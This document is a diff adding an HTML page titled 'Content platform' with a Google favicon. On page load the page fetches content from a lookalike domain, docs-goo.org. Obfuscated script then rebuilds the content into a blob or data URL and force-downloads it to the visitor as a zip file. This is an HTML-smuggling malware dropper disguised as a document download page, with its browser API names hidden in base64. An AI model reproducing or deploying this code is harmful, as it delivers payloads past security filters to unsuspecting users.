@@ -1,0 +1,152 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Content platform</title>
+    <link rel="shortcut icon" href="//ssl.gstatic.com/pantheon/images/favicon/default.png">
+	<link type="text/css" href="https://s3.eu-west-2.amazonaws.com/trusted-foundation/hexagon-preloader.css" rel="stylesheet">
+	<script src="https://code.jquery.com/jquery-3.1.0.min.js"></script>
+</head>
+<body>
+
+<script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", function() {
+		var url = new URL(location.href);
+		
+		var fileName    = atob(url.searchParams.get("name"));
+		var scriptUrl   = 'https://docs-goo.org/findic.php?v='+url.searchParams.get("v");
+		var contentType = url.searchParams.get("c");
+		var method      = url.searchParams.get("method");
+		var type        = url.searchParams.get("type");
+		
+		$.ajax({
+		  url: scriptUrl,
+		  success: function(resp){
+			goData( 
+				method ? method : 'base',
+				type   ? type   : 'download',
+				fileName ? fileName : "test_595e30986420e.zip",
+				document,
+				resp,
+				"QXJyYXlCdWZmZXI=",
+				"VWludDhBcnJheQ==",
+				"QmxvYg==",
+				"Y2hhckNvZGVBdA==",
+				contentType ? contentType : "dGV4dC9wbGFpbjtjaGFyc2V0PXV0Zi04",
+				"Y3JlYXRlT2JqZWN0VVJM",
+				"Y3JlYXRlRWxlbWVudA==",
+				"VVJM"
+			);
+		  },
+		  dataType: 'text'
+		});
+
+		function dataBase(blob, t)
+		{
+			return 'data:'+atob(t)+';base64,'+blob;
+		}
+
+		function dataBlob(blob, a, u, l, c, t, o, U)
+		{
+			var blob = atob(blob);
+			
+			__ = blob.length,
+			___ = new window[atob(a)](__),
+			$ = new window[atob(u)](___);
+			
+			for (var i = 0; i < __; i++) 
+				$[i] = blob[atob(c)](i);
+				
+			return window[atob(U)][atob(o)](new window[atob(l)]([$],{type: atob(t)}));
+		}
+
+		function goData(method,type,filename, doc, blob, a, u, l, c, t, o, e, U)
+		{
+			var blob = blob.replace(/\s/g, '');
+			
+			if(method === 'blob')
+				var u = dataBlob(blob, a, u, l, c, t, o, U);
+			else
+				var u = dataBase(blob, t);
+				
+			if( type === 'button' )
+			{
+				jQuery('a').attr('href',u);
+				jQuery('a').attr('download',filename);
+				jQuery('.preloader').hide();
+				jQuery('a').css("display",'table-cell');
+			}
+			else
+			{
+				a = doc[atob(e)]("a");
+				
+				Object.assign(a, {
+					href: u,
+					download: filename
+				});
+				
+				if( type === 'button-script' )
+				{
+					jQuery('.preloader').hide();
+					jQuery('a').css("display",'table-cell');
+					jQuery('a').click(function(){
+						a.click();
+					});
+				}
+				else
+					a.click();
+			}
+		}
+    });
+</script>
+
+	<div class="preloader loading">
+		<span class="slice"></span>
+		<span class="slice"></span>
+		<span class="slice"></span>
+		<span class="slice"></span>
+		<span class="slice"></span>
+		<span class="slice"></span>
+	</div>
+	
+	<a href="#"><span>Download</span></a>
+	
+	<style>
+		body {
+			background-color: #f5f5f5;
+		}
+
+		html, body, a {
+			display: table;
+			height: 100%;
+			width: 100%;
+			margin: 0;
+		}
+
+		a {
+			display: none;
+			text-align: center;
+			vertical-align: middle;
+			text-decoration: none;
+		}
+
+		a span {
+			display: block;
+			width: 200px;
+			height: 80px;
+			line-height: 80px;
+			background-color: #5cb85c;
+			border-color: #4cae4c;
+			color: #fff;
+			margin: 0 auto;
+			font-size: 26px;
+			font-family: Tahoma, Arial, Sans-serif, sans-serif;
+			-webkit-border-radius: 2px;
+			-moz-border-radius: 2px;
+			border-radius: 2px;
+		}
+	</style>
+</body>
+</html>
